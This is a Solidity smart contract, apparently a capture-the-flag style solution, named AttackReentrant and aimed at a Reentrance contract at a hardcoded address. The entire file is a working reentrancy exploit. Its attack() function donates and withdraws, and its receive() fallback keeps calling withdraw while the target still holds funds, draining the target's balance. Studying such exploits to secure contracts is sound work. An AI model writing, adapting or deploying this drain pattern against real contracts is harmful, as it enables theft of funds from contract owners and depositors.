// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "./Reentrance.sol";


contract AttackReentrant {

    Reentrance reentrance = Reentrance(0xb2647946939a3c8946cf37473533466a05c91F6F);
    uint targetValue = 1000000000000000;

    function attack() public payable {
        reentrance.donate.value(msg.value)(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint targetBalance = address(reentrance).balance;
        if (targetBalance >= targetValue) {
            reentrance.withdraw(targetValue);
        }
    }

}